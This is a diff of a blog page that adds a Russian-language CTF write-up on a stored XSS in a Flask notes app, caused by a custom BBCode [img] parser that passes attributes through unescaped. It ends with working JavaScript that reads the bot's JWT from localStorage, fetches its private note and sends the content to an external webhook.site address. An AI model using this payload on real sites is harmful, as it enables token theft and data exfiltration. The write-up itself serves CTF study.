@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Test post</title>
+  <title>Test writeup SAS CTF</title>
   <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
 		<link
 			href="https://unpkg.com/prismjs@1.20.0/themes/prism-okaidia.css"
@@ -11,16 +11,209 @@
 		/></head>
 <body class="bg-gray-100 font-sans leading-relaxed">
   <header class="bg-white shadow p-4">
-    <h1 class="text-2xl font-bold">Test post</h1>
+    <h1 class="text-2xl font-bold">Test writeup SAS CTF</h1>
     <nav class="mt-2">
       <a href="/" class="text-blue-600 hover:underline">Home</a>
     </nav>
   </header>
   <main class="max-w-3xl mx-auto p-6 bg-white rounded-lg shadow my-6">
-    <h1>test h1</h1>
-<p>test text
-<img src="./images/sample.jpg" alt="Sample Image"></p>
-<pre class="language-bash"><code class="language-bash"><span class="token builtin class-name">test</span> code</code></pre>
+    <p>Приложение представляет из  себя классический ctf таск на xss - есть сервис заметок и бот, переходящий по ссылке на заметку пользователя (оставив предварительно у себя на аккаунте приватную заметку с флагом).
+Рассматривая функциональность сервиса можно обратить внимание на несколько нетипичных для сервиса с Flask на бэкенде вещей:</p>
+<ul>
+<li>для авторизации используется не <code>session</code> встроенный в фреймворк, а <code>jwt</code> токен в запросах вида.</li>
+</ul>
+<pre><code>GET /api/posts?page=1&amp;per_page=5 HTTP/1.1
+Host: [::1]
+Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTc0ODE2MzY0NywianRpIjoiODEwZjU4ODItZmE2Mi00NGVmLTg2NDMtYWM0OTNlZjRhZDA1IiwidHlwZSI6ImFjY2VzcyIsInN1YiI6ImRhOWIzNjQyLWY0NDMtNGIwNS1iMjAzLWVkOGM0N2E0NTA0ZCIsIm5iZiI6MTc0ODE2MzY0NywiZXhwIjoxNzQ4MTY3MjQ3LCJsb2dpbl90aW1lIjoxNzQ4MTYzNjQ3LjMxMDQ3fQ.KO6djKOdHCLN601cxw7weVtMM9aN5kcxnG589LjVKtY
+</code></pre>
+<p>причем <code>jwt</code> - даже не куки а именно <code>Authorization</code> заголовок.</p>
+<ul>
+<li>во время использования сервиса бросается в глаза возможность отставлять комментарии под заметками которой часто нет в тасках подобного вида.</li>
+<li>в поле комментария отображается очень подозрительная надпись
+![[Pasted image 20250527201945.png]]
+Предлагается использовать некий язык разметки под названием <code>BBCode</code> а как мы знаем в реалкейсах очень часто встречается xss из-за WYSIWYG-редакторов при внедрении html в комментарии или электронную почту или при использовании markdown.</li>
+</ul>
+<h2>Первичное предположение уязвимости</h2>
+<ol>
+<li>Проблема в BBCode</li>
+<li>Проблема в JWT</li>
+</ol>
+<h2>Проблема в BBCode</h2>
+<p>Открываем код сервиса в попытке проверить зависимости и посмотреть не устарела ли версия модуля с поддержкой BBCode однако его не нахожу, обработка BBCode кастомная что еще раз наталкивает на мысли об уязвимой реализации.
+Смотрим <code>backend/app/routes/comments.py</code></p>
+<pre><code>@comments_bp.route('/user/&lt;user_id&gt;/posts/&lt;post_id&gt;', methods=['POST'])
+@jwt_required()
+def create_comment(user_id, post_id):
+	....
+    parser = BBCodeParser()
+    content_html = parser.parse(content)
+	....
+</code></pre>
+<p>Перейдем в <code>backend/app/utils/bb_parser.py</code> и рассмотрим код <code>BBCodeParser</code>.</p>
+<pre><code>def parse(self, text):
+	if not text:
+		return &quot;&quot;
+
+	escaped_text = html.escape(text)
+	
+	result = escaped_text
+	for tag in self.allowed_tags:
+		if tag in self.tag_handlers:
+			result = self.tag_handlers[tag](result)
+	
+	return result
+</code></pre>
+<blockquote>
+<p>Рассмотрим процесс обработки обычной xss нагрузки `<img src=1 onerror=alert(1)>.
+Сначала весь текст экранируется с помощью html.escape(text). Это преобразует специальные HTML-символы в их безопасные эквиваленты:
+- &lt; → &lt;
+- &gt; → &gt;
+- &amp; → &amp;</p>
+</blockquote>
+<pre><code>s = s.replace(&quot;&amp;&quot;, &quot;&amp;amp;&quot;) # Must be done first!
+s = s.replace(&quot;&lt;&quot;, &quot;&amp;lt;&quot;)
+s = s.replace(&quot;&gt;&quot;, &quot;&amp;gt;&quot;)
+if quote:
+	s = s.replace('&quot;', &quot;&amp;quot;&quot;)
+	s = s.replace('\'', &quot;&amp;#x27;&quot;)
+return s
+</code></pre>
+<blockquote>
+<p>На выходе функции получаем <code>&amp;lt;img src=1 onerror=alert(1)&amp;gt;</code>.</p>
+</blockquote>
+<p>При просмотре того как обрабатывалась бы обычная xss-нагрузка видим что хотя код ниже отработал, он бы ничего не сделал.</p>
+<pre><code>for tag in self.allowed_tags:
+	if tag in self.tag_handlers:
+		result = self.tag_handlers[tag](result)
+</code></pre>
+<p>Согласно логики работы парсера BBCode для того чтобы разметка img была обработана она должна соответствовать regex.</p>
+<pre><code>simple_pattern = r'\[img\](https?://[^&quot;\'\[\]&lt;&gt;]+?\.(?:jpg|jpeg|png|gif))\[/img\]'
+</code></pre>
+<p>Полный код обработчика тега img представлен ниже.</p>
+<pre><code>    def _handle_image(self, text):
+        simple_pattern = r'\[img\](https?://[^&quot;\'\[\]&lt;&gt;]+?\.(?:jpg|jpeg|png|gif))\[/img\]'
+        text = re.sub(simple_pattern, 
+                      r'&lt;img src=&quot;\1&quot; alt=&quot;User posted image&quot; style=&quot;max-width:100%;&quot;&gt;', 
+                      text)
+
+        dim_pattern = r'\[img=(\d+),(\d+)\](https?://[^&quot;\'\[\]&lt;&gt;]+?\.(?:jpg|jpeg|png|gif))\[/img\]'
+        text = re.sub(dim_pattern, 
+                      r'&lt;img src=&quot;\3&quot; width=&quot;\1&quot; height=&quot;\2&quot; alt=&quot;User posted image&quot; style=&quot;max-width:100%;&quot;&gt;', 
+                      text)
+
+        attr_pattern = r'\[img ([^\]]+)\](https?://[^&quot;\'\[\]&lt;&gt;]+?\.(?:jpg|jpeg|png|gif))\[/img\]'
+        
+        def img_attr_replacer(match):
+            attrs_str = match.group(1)
+            img_url = match.group(2)
+            return f'&lt;img src=&quot;{img_url}&quot; {attrs_str} style=&quot;max-width:100%;&quot;&gt;'
+            
+        text = re.sub(attr_pattern, img_attr_replacer, text)
+        
+        return text
+</code></pre>
+<p>Регулярное выражение attr_pattern находит тег вида <code>[img атрибуты]URL[/img]</code>.</p>
+<ul>
+<li>attrs_str — это строка атрибутов (в нашем случае onerror=alert(1)).</li>
+<li>img_url — это URL изображения <code>(http://example.com/image.jpg)</code>.</li>
+<li>Функция img_attr_replacer вставляет attrs_str напрямую в HTML-тег <img> без какой-либо фильтрации.</li>
+</ul>
+<h4>Пример обработки</h4>
+<pre><code>def img_attr_replacer(match):
+            attrs_str = match.group(1)
+            img_url = match.group(2)
+            return f'&lt;img src=&quot;{img_url}&quot; {attrs_str} style=&quot;max-width:100%;&quot;&gt;'
+</code></pre>
+<p>Для ввода `[img onerror=alert(1)]http://example.com/image.jpg[/img]:</p>
+<ul>
+<li>match.group(1) = onerror=alert(1).</li>
+<li>match.group(2) = <code>http://example.com/image.jpg</code>
+Результат замены <code>&lt;img src=&quot;http://example.com/image.jpg&quot; onerror=alert(1) style=&quot;max-width:100%;&quot;&gt;</code>
+![[Pasted image 20250527205710.png]]XSS найден. Боту передается как раз ссылка на наш пост, значит у него тоже сработает javascript.</li>
+</ul>
+<h4>Troubleshooting</h4>
+<p>К сожалению есть несколько проблем</p>
+<ul>
+<li>мы все еще не знаем адрес заметки бота</li>
+<li>раз не используется куки, просто написать в <code>fetch</code> строчку <code>credentials: 'include'</code> для того чтобы использовать авторизацию пользователя не получится</li>
+</ul>
+<h5>Получаем токен авторизации</h5>
+<p>В браузере не встроен автоматический механизм запоминания токенов используемых в заголовке <code>Authorization</code>, значит это делается на фронте у пользователя. Посмотрим где хранятся токены (вероятно в localstorage)
+Смотрим код и видим строчки вида</p>
+<pre><code>interceptors.request.use((e=&gt;{const t=localStorage.getItem(&quot;DiarrheaTokenBearerInLocalStorageForSecureRequestsContactAdminHeKnowsHotToUseWeHaveManyTokensHereSoThisOneShouldBeUnique&quot;)
+</code></pre>
+<p>Проверяем в браузере - так и есть.
+![[Pasted image 20250527210950.png]]</p>
+<h5>Получаем uuid заметки бота</h5>
+<p>По адресу <code>/dashboard</code> фронтенд пользователя делает запрос вида</p>
+<pre><code>GET /api/posts?page=1&amp;per_page=5 HTTP/1.1
+</code></pre>
+<p>Получая в ответ</p>
+<pre><code>{
+  &quot;items&quot;: [
+    {
+      &quot;author&quot;: &quot;testtest&quot;,
+      &quot;comments_count&quot;: 1,
+      &quot;content&quot;: &quot;test&quot;,
+      &quot;created_at&quot;: &quot;2025-05-27T17:07:44.284123&quot;,
+      &quot;id&quot;: 1,
+      &quot;top_comments&quot;: [
+        {
+          &quot;author&quot;: &quot;testtest&quot;,
+          &quot;content&quot;: &quot;&lt;img src=\&quot;http://example.com/image.jpg\&quot; onerror=alert(1) style=\&quot;max-width:100%;\&quot;&gt;&quot;,
+          &quot;created_at&quot;: &quot;2025-05-27T17:56:53.432094&quot;,
+          &quot;id&quot;: 1,
+          &quot;post_id&quot;: 1,
+          &quot;user_id&quot;: &quot;b3e28d05-23b1-4d0c-8acb-cbd50bce2602&quot;
+        }
+      ],
+      &quot;updated_at&quot;: &quot;2025-05-27T17:07:44.284133&quot;,
+      &quot;user_id&quot;: &quot;b3e28d05-23b1-4d0c-8acb-cbd50bce2602&quot;
+    }
+  ],
+  &quot;page&quot;: 1,
+  &quot;pages&quot;: 1,
+  &quot;per_page&quot;: 5,
+  &quot;total&quot;: 1
+}
+</code></pre>
+<p>В свою очередь заметки доступны по адресу вида</p>
+<pre><code>@posts_bp.route('/user/&lt;user_id&gt;/posts/&lt;post_id&gt;', methods=['GET'])
+</code></pre>
+<p>Ввиду того, что мы знаем что комментарий оставляется ботом сразу после регистрации, <code>post_id</code>. Заметка будет лежать по адресу.</p>
+<pre><code>/user/&lt;user_id&gt;/posts/1
+</code></pre>
+<p>В свою очередь user_id нам известен из запроса на <code>/api/posts</code>.</p>
+<h5>Exploit</h5>
+<p>Таким образом эксплоит должен выполнять следующие действия.</p>
+<ol>
+<li>Получает token из localstorage</li>
+<li>Использует его в заголовке <code>Authorization: Bearer</code> далее</li>
+<li>Делает запрос на <code>/api/posts</code></li>
+<li>Получает <code>user_id</code></li>
+<li>Делает запрос на <code>/user/&lt;user_id&gt;/posts/&lt;post_id&gt;</code></li>
+<li>Получает флаг из <code>class=&quot;post-content&quot;</code></li>
+<li>Отправляет base64 флаг на webhook</li>
+</ol>
+<pre><code>fetch(&quot;/api/posts&quot;, {
+    headers: {
+        'Authorization': `Bearer ${localStorage.getItem(&quot;DiarrheaTokenBearerInLocalStorageForSecureRequestsContactAdminHeKnowsHotToUseWeHaveManyTokensHereSoThisOneShouldBeUnique&quot;)}`
+    }
+})
+.then(response =&gt; response.json())
+.then(data =&gt; {
+    return fetch(`/api/posts/user/${data.items[0].user_id}/posts/1`, { 
+        headers: {
+            'Authorization': `Bearer ${localStorage.getItem(&quot;DiarrheaTokenBearerInLocalStorageForSecureRequestsContactAdminHeKnowsHotToUseWeHaveManyTokensHereSoThisOneShouldBeUnique&quot;)}`
+        } 
+    });
+})
+.then(response =&gt; response.json())
+.then(flag =&gt; {
+    const content = flag.comments.items[0].content;
+    fetch(`https://webhook.site/ce7bcd4f-0512-40d5-886b-168da9b25574?flag=${btoa(content)}`);
+})
+</code></pre>
 
   </main>
 </body>
